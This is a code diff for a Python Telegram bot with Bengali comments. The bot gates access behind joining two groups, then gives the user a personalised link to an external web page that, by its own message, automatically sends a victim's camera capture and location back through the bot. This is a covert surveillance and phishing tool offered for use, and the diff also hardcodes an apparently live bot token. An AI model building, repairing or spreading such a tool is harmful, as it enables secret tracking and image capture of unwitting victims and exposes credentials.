@@ -3,17 +3,14 @@ import os
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
-# ===1======= কনফিগারেশন ==========
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8756510522:AAEOEqk0mYKuIr9c7jB0mPCk2JLxogCQhs8")  # Render এ Environment Variable বসাবেন
-GROUP_1_ID = int(os.getenv("GROUP_1_ID", -1003885529323))   # ঋণাত্মক সংখ্যা
+# ========== কনফিগারেশন ==========
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8756510522:AAEOEqk0mYKuIr9c7jB0mPCk2JLxogCQhs8")
+GROUP_1_ID = int(os.getenv("GROUP_1_ID", -1003885529323))
 GROUP_2_ID = int(os.getenv("GROUP_2_ID", -1003867100912))
-LINK_URL = os.getenv("LINK_URL", "https://hilarious-tanuki-3a2b39.netlify.app/")  # আপনার HTML পেজের লিংক
+LINK_URL = os.getenv("LINK_URL", "https://hilarious-tanuki-3a2b39.netlify.app/")
 
-GROUP_1_INVITE = "https://t.me/+NJ4VnzY1mp45YzY1"   # আপনার গ্রুপের ইনভাইট লিংক
+GROUP_1_INVITE = "https://t.me/+NJ4VnzY1mp45YzY1"
 GROUP_2_INVITE = "https://t.me/oxifgaradarkmind"
-
-# ওয়েবহুক সেটআপের জন্য PORT (Render এ 10000 বা 8443 দরকার)
-PORT = int(os.environ.get('PORT', 8443))
 
 logging.basicConfig(level=logging.INFO)
 
@@ -39,10 +36,10 @@ async def check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await query.edit_message_text("❌ বটকে গ্রুপে অ্যাডমিন বানান অথবা Chat ID সঠিক নয়।")
         return
-    
+
     ok1 = member1.status in ["member", "administrator", "creator"]
     ok2 = member2.status in ["member", "administrator", "creator"]
-    
+
     if ok1 and ok2:
         await query.edit_message_text(
             f"✅ আপনি দুই গ্রুপেই জয়েন করেছেন!\n\n🎯 আপনার টুলের লিংক:\n`{LINK_URL}?bot={BOT_TOKEN}&chat={query.from_user.id}`\n\nলিংকে ক্লিক করলেই ক্যামেরা ও লোকেশন অটো পাঠাবে।\n\n⚠️ শুধুমাত্র আপনার জন্য এই লিংক।",
@@ -55,15 +52,14 @@ async def check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(
             f"❌ আপনি এখনো জয়েন করেননি: {', '.join(missing)}\n\nউপরের বাটনে ক্লিক করে জয়েন করুন।",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔁 পুনরায় চেক করুন", callback_data="check")]])
-            } 
-    def main():
+        )
+
+def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(check_callback, pattern="check"))
-    
-    # 🔥 শুধু এই লাইনটুকু রাখুন, বাকিটা বাদ দিন 🔥
+    # Polling মেথড (ওয়েবহুক ছাড়া)
     app.run_polling()
-    # যদি লোকাল টেস্ট করতে চান, তাহলে ওয়েবহুক বাদ দিয়ে app.run_polling() ব্যবহার করবেন।
 
 if __name__ == "__main__":
     main()
